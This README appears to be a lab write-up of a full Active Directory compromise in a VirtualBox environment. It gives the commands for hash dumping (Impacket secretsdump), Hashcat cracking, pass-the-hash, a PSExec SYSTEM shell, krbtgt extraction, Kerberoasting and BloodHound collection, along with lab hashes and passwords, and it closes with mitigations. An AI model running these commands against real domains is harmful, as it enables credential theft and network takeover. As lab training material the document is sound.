# Active Directory Lab – Full Domain Compromise

## Overview

Full Active Directory attack chain against a self-built lab environment. This lab covers AD environment setup from scratch, network enumeration, credential attacks, hash dumping, Pass-the-Hash, and domain compromise via SYSTEM shell on the domain controller.

**Attacker:** Kali Linux (192.168.56.102) | **Domain Controller:** DC01 (192.168.56.10) | **Client:** WIN11-Client (192.168.56.20)

**Domain:** lab.local | **Environment:** VirtualBox Host-Only Network

**Attack Path:**

Network Enumeration → SMB Enumeration → User Enumeration → Hash Dumping → Hash Cracking → Pass-the-Hash → PSExec SYSTEM Shell → krbtgt Extraction → Kerberoasting → BloodHound AD Mapping

---

## Lab Setup

### Windows Server 2022 Installation

<img src="01_server_install_complete.png" width="800">

### Server Renamed to DC01

<img src="02_server_renamed_DC01.png" width="800">

### AD DS Role Installed

<img src="03_AD_DS_role_installed.png" width="800">

### Domain Controller Configured

<img src="04_domain_controller_configured.png" width="800">

### AD Users Created (jsmith, jdoe, bjones)

<img src="06_ad_users_created.png" width="800">

### IT_Staff Security Group Created

<img src="07_ad_group_created.png" width="800">

### Static IP Configured on DC01

<img src="08a_static_ip_set.png" width="800">

<img src="08b_dns_set.png" width="800">

<img src="08_static_ip_configured.png" width="800">

### Windows 11 Client Joined to Domain

<img src="10_domain_join_success.png" width="800">

<img src="11_win11_client_whoami.png" width="800">

### WIN11-Client Verified in Active Directory

<img src="12_client_joined_domain.png" width="800">

---

## 1. Network Discovery

ARP scan identified all live hosts on the lab network.

<img src="01_ad_network_discovery.png" width="800">

---

## 2. Domain Controller Port Scan

Full TCP scan with service detection confirmed DC01 as the domain controller for lab.local.

<img src="02_dc01_nmap_scan.png" width="800">

Key findings:

- Port 53 — DNS
- Port 88 — Kerberos
- Port 139/445 — SMB
- Port 389/3268 — LDAP
- Port 5985 — WinRM
- SMB Signing: Enabled

---

## 3. SMB Enumeration

CrackMapExec confirmed domain details and SMB access.

<img src="03_crackmapexec_smb_enum.png" width="800">

---

## 4. User Enumeration

All domain users enumerated using valid credentials.

<img src="04_crackmapexec_user_enum.png" width="800">

---

## 5. Share Enumeration

Domain shares enumerated. Administrator has READ/WRITE access to ADMIN$ and C$ confirming full administrative access.

<img src="05_crackmapexec_shares.png" width="800">

---

## 6. Hash Dumping – secretsdump

All NTLM password hashes extracted from the domain controller using Impacket secretsdump via the DRSUAPI method.

<img src="06a_secretsdump_top.png" width="800">

<img src="06b_secretsdump_hashes.png" width="800">

Hashes extracted:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0dbf4b87c0bb3c0f514f9695d7593fb1:::
lab.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
lab.local\bjones:1104:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
lab.local\jdoe:1105:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

---

## 7. Hash Cracking – Hashcat

NTLM hash cracked offline using Hashcat with a custom wordlist.

```bash
hashcat -m 1000 2b576acbe6bcfda7294d6bd18041b8fe custom_wordlist.txt
```

<img src="07_hashcat_cracked.png" width="800">

**Result:** `2b576acbe6bcfda7294d6bd18041b8fe:Password123!`

---

## 8. Pass-the-Hash

Authenticated as Administrator using only the NTLM hash — no plaintext password required.

```bash
crackmapexec smb 192.168.56.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
```

<img src="08_pass_the_hash.png" width="800">

**Result:** Pwn3d! — Full administrative access confirmed via hash alone.

---

## 9. SYSTEM Shell via PSExec

Obtained a SYSTEM level shell on the domain controller using Impacket PSExec with Pass-the-Hash.

```bash
impacket-psexec lab.local/Administrator@192.168.56.10 -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

<img src="09_psexec_system_shell.png" width="800">

<img src="10_dc_system_proof.png" width="800">

<img src="11_whoami_system.png" width="800">

---

## 10. krbtgt Hash Extraction

The krbtgt account hash was extracted — this enables Golden Ticket attacks, which allow an attacker to forge Kerberos tickets and maintain persistent domain admin access even after password resets.

```bash
impacket-secretsdump lab.local/Administrator:'Password123!'@192.168.56.10 -just-dc-user krbtgt
```

<img src="12_krbtgt_hash.png" width="800">

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0dbf4b87c0bb3c0f514f9695d7593fb1:::
```

---

## 11. Final AD Proof

<img src="13_final_ad_proof.png" width="800">

---

## 12. Kerberoasting

A service account called `sqlservice` was created with an SPN registered on `MSSQLSvc/DC01.lab.local:1433` to simulate a real SQL Server environment. Any account with an SPN registered is vulnerable to Kerberoasting — an attacker can request the Kerberos ticket for that service and crack it offline to recover the plaintext password.

### SPN Registered on DC01

```powershell
setspn -a MSSQLSvc/DC01.lab.local:1433 lab\sqlservice
```

<img src="14_spn_registered.png" width="800">

### Kerberos Ticket Requested from Kali

```bash
impacket-GetUserSPNs lab.local/Administrator:'Password123!' -dc-ip 192.168.56.10 -request -outputfile kerberoast_hash.txt
```

<img src="15_kerberoast_ticket.png" width="800">

### Hash Cracked Offline

```bash
hashcat -m 13100 kerberoast_hash.txt custom_wordlist2.txt --force
```

<img src="16_kerberoast_cracked.png" width="800">

**Result:** `$krb5tgs$23$*sqlservice$LAB.LOCAL$...:Summer2024`

The service account password was recovered offline without ever interacting with the account directly. In a real environment service accounts often have elevated privileges making this a critical finding.

---

## 13. BloodHound AD Enumeration

BloodHound maps Active Directory relationships and attack paths visually. Data was collected remotely from Kali using bloodhound-python without needing to run anything on the Windows machines.

```bash
bloodhound-python -u Administrator -p 'Password123!' -d lab.local -ns 192.168.56.10 -c All
```

### DC01 Object Information

BloodHound identified DC01 as a Tier Zero asset with Unconstrained Delegation enabled — a critical misconfiguration in real environments that allows any authenticated user to impersonate any domain account including Domain Admins.

<img src="17_bloodhound_dc01_object_info.png" width="800">

### Attack Path from Administrator to DC01

BloodHound mapped the full privilege path from `ADMINISTRATOR@LAB.LOCAL` to `DC01.LAB.LOCAL` through three separate group memberships — Domain Admins, Enterprise Admins, and Administrators — each with different permissions over the domain controller.

<img src="18_bloodhound_attack_path.png" width="800">

### Shortest Path to Domain Admins

The Cypher query confirms `ADMINISTRATOR@LAB.LOCAL` is a direct member of `DOMAIN ADMINS@LAB.LOCAL` — a single hop to full domain control.

<img src="19_bloodhound_shortest_path_domain_admins.png" width="800">

### All Domain Users

BloodHound enumerated all 9 accounts in the domain. KRBTGT and ADMINISTRATOR are both flagged as Tier Zero — the most critical accounts in the environment. SQLSERVICE is visible as the Kerberoastable service account.

<img src="20_bloodhound_all_users.png" width="800">

---

## Findings Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Network Recon | Nmap Full Port Scan | DC01 and all AD ports identified |
| SMB Enumeration | CrackMapExec | Domain info, users, shares confirmed |
| Credential Dumping | Impacket secretsdump | All NTLM hashes extracted |
| Hash Cracking | Hashcat NTLM mode | Password recovered offline |
| Pass-the-Hash | CrackMapExec PTH | Admin access without plaintext password |
| Remote Execution | Impacket PSExec | SYSTEM shell on domain controller |
| Persistence Risk | krbtgt extraction | Golden Ticket attack possible |
| Kerberoasting | GetUserSPNs + Hashcat | Service account password cracked offline |
| AD Mapping | BloodHound CE | Full attack paths and Tier Zero assets mapped |

---

## Recommended Mitigations

- Enforce strong unique passwords across all accounts
- Enable Protected Users security group to restrict credential caching
- Implement Credential Guard to protect NTLM hashes in memory
- Monitor for secretsdump and PSExec activity in Windows Event Logs
- Restrict SMB access and disable NTLM authentication where possible
- Rotate krbtgt password twice to invalidate any existing Golden Tickets
- Implement tiered administration model to limit lateral movement
- Audit and remove unnecessary SPNs from privileged accounts
- Use Managed Service Accounts (MSAs) instead of regular user accounts for services
- Regularly review BloodHound attack paths to identify and remediate privilege escalation routes

---

## Skills Demonstrated

- Active Directory Environment Setup and Configuration
- Network Enumeration (nmap, CrackMapExec)
- SMB Enumeration and Share Analysis
- NTLM Hash Dumping (Impacket secretsdump)
- Offline Hash Cracking (Hashcat)
- Pass-the-Hash Attack
- Remote Code Execution (Impacket PSExec)
- krbtgt Extraction and Golden Ticket Analysis
- SPN Registration and Kerberoasting (Impacket GetUserSPNs)
- BloodHound AD Enumeration and Attack Path Mapping
- Active Directory Privilege Escalation